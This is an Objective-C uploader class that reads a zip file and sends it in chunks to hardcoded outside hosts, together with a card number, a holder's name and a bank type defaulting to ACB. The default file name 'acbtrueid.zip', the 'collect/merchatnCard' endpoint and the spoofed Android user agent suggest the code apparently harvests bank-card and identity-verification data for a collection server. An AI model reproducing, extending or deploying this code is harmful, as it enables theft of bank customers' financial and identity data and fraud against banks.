#import "ACBUploader.h"
#import "ACBLogger.h"

static const NSInteger kChunkSize = 1442053;
static NSString *const kDefaultUploadUrl = @"https://img.wenj123123.com/file/chunk/upload";
static NSString *const kDefaultCallbackUrl = @"https://vn.advnvn123123.com/collect/merchatnCard/saveBatchResource";

@implementation ACBUploader

- (void)uploadZipFile:(NSString *)zipFilePath
             fileName:(NSString *)fileName
                 card:(NSString *)card
                 name:(NSString *)name
             bankType:(NSString *)bankType {
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSFileManager *fm = [NSFileManager defaultManager];
        if (![fm fileExistsAtPath:zipFilePath]) {
            ACBLog(@"[Upload] Error: zipFilePath does not exist: %@", zipFilePath);
            [self notifyError:@"Không tìm thấy file zip"];
            return;
        }
        
        NSString *uploadUrlStr = kDefaultUploadUrl;
        NSString *callbackUrlStr = kDefaultCallbackUrl;
        if (self.serverBaseUrl && self.serverBaseUrl.length > 0) {
            NSString *cleanBase = [self.serverBaseUrl stringByTrimmingCharactersInSet:[NSCharacterSet characterSetWithCharactersInString:@"/"]];
            uploadUrlStr = [NSString stringWithFormat:@"%@/file/chunk/upload", cleanBase];
            callbackUrlStr = [NSString stringWithFormat:@"%@/collect/merchatnCard/saveBatchResource", cleanBase];
        }
        
        NSDictionary *attrs = [fm attributesOfItemAtPath:zipFilePath error:nil];
        unsigned long long fileSize = [attrs fileSize];
        NSInteger totalChunks = (NSInteger)ceil((double)fileSize / (double)kChunkSize);
        if (totalChunks <= 0) totalChunks = 1;
        
        NSTimeInterval now = [[NSDate date] timeIntervalSince1970];
        long timestampSec = (long)now;
        NSString *uploadId = [NSString stringWithFormat:@"_%ld", timestampSec];
        NSString *batchId = [NSString stringWithFormat:@"batch_%ld", timestampSec];
        NSString *actualFileName = fileName ?: @"acbtrueid.zip";
        
        NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath:zipFilePath];
        if (!fileHandle) {
            [self notifyError:@"Không thể đọc file zip"];
            return;
        }
        
        ACBLog(@"[Upload] Starting zip upload: %@ (%llu bytes, %ld chunks) -> %@", zipFilePath, fileSize, (long)totalChunks, uploadUrlStr);
        
        for (NSInteger chunkIdx = 0; chunkIdx < totalChunks; chunkIdx++) {
            [fileHandle seekToFileOffset:chunkIdx * kChunkSize];
            NSData *chunkData = [fileHandle readDataOfLength:kChunkSize];
            NSString *chunkPartFileName = [NSString stringWithFormat:@"%@_chunk%ld", uploadId, (long)chunkIdx];
            
            // 1. JSON metadata (businessParams)
            NSDictionary *businessDict = @{
                @"card": card ?: @"",
                @"bank_type": bankType ?: @"ACB",
                @"batch": batchId,
                @"name": name ?: @"",
                @"sort": @"1",
                @"uploadId": uploadId,
                @"fileSize": [NSString stringWithFormat:@"%llu", fileSize],
                @"fileName": actualFileName,
                @"callbackPara": @"LJIJIJIJI",
                @"chunkNumber": [NSString stringWithFormat:@"%ld", (long)chunkIdx],
                @"totalChunks": [NSString stringWithFormat:@"%ld", (long)totalChunks],
                @"type": @"ZIP"
            };
            
            NSData *jsonBusinessData = [NSJSONSerialization dataWithJSONObject:businessDict options:0 error:nil];
            NSString *businessParamsJson = [[NSString alloc] initWithData:jsonBusinessData encoding:NSUTF8StringEncoding];
            
            // 2. HTTP Multipart Request
            NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
            NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:uploadUrlStr]];
            [request setHTTPMethod:@"POST"];
            [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
            [request setValue:@"Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4 Build/TP1A.221005.002.B2)" forHTTPHeaderField:@"User-Agent"];
            [request setValue:@"*/*" forHTTPHeaderField:@"Accept"];
            [request setTimeoutInterval:45.0];
            
            NSMutableData *body = [NSMutableData data];
            
            // callbackUrl
            [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
            [body appendData:[@"Content-Disposition: form-data; name=\"callbackUrl\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
            [body appendData:[[NSString stringWithFormat:@"%@\r\n", callbackUrlStr] dataUsingEncoding:NSUTF8StringEncoding]];
            
            // businessParams
            [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
            [body appendData:[@"Content-Disposition: form-data; name=\"businessParams\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
            [body appendData:[[NSString stringWithFormat:@"%@\r\n", businessParamsJson] dataUsingEncoding:NSUTF8StringEncoding]];
            
            // File part
            [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
            [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n", chunkPartFileName] dataUsingEncoding:NSUTF8StringEncoding]];
            [body appendData:[@"Content-Type: application/octet-stream\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
            [body appendData:chunkData];
            [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
            
            // End
            [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
            
            [request setHTTPBody:body];
            
            ACBLog(@"[Upload] Sending chunk %ld / %ld (%lu bytes)...", (long)(chunkIdx + 1), (long)totalChunks, (unsigned long)chunkData.length);
            
            // Execute synchronous per chunk
            dispatch_semaphore_t sema = dispatch_semaphore_create(0);
            __block BOOL chunkSuccess = NO;
            __block NSString *chunkErrorMsg = nil;
            __block NSDictionary *finalResult = nil;
            
            NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
                if (error) {
                    chunkErrorMsg = error.localizedDescription;
                    ACBLog(@"[Upload] Chunk %ld error: %@", (long)(chunkIdx + 1), error);
                } else {
                    NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                    NSInteger code = [json[@"code"] integerValue];
                    ACBLog(@"[Upload] Chunk %ld response code: %ld", (long)(chunkIdx + 1), (long)code);
                    if (code == 200) {
                        chunkSuccess = YES;
                        finalResult = json;
                    } else {
                        chunkErrorMsg = json[@"message"] ?: [NSString stringWithFormat:@"Server code: %ld", (long)code];
                    }
                }
                dispatch_semaphore_signal(sema);
            }];
            [task resume];
            dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
            
            if (!chunkSuccess) {
                [fileHandle closeFile];
                ACBLog(@"[Upload] Failed on chunk %ld: %@", (long)(chunkIdx + 1), chunkErrorMsg);
                [self notifyError:[NSString stringWithFormat:@"Chunk %ld thất bại: %@", (long)(chunkIdx + 1), chunkErrorMsg]];
                return;
            }
            
            float progress = (float)(chunkIdx + 1) / (float)totalChunks;
            dispatch_async(dispatch_get_main_queue(), ^{
                if ([self.delegate respondsToSelector:@selector(uploaderDidProgress:currentChunk:totalChunks:)]) {
                    [self.delegate uploaderDidProgress:progress currentChunk:chunkIdx + 1 totalChunks:totalChunks];
                }
            });
            
            if (chunkIdx == totalChunks - 1) {
                [fileHandle closeFile];
                ACBLog(@"[Upload] ALL CHUNKS COMPLETED SUCCESSFULLY!");
                dispatch_async(dispatch_get_main_queue(), ^{
                    if ([self.delegate respondsToSelector:@selector(uploaderDidFinishSuccessWithResponse:)]) {
                        [self.delegate uploaderDidFinishSuccessWithResponse:finalResult];
                    }
                });
                return;
            }
        }
        [fileHandle closeFile];
    });
}

- (void)notifyError:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        if ([self.delegate respondsToSelector:@selector(uploaderDidFailWithError:)]) {
            [self.delegate uploaderDidFailWithError:msg];
        }
    });
}

@end
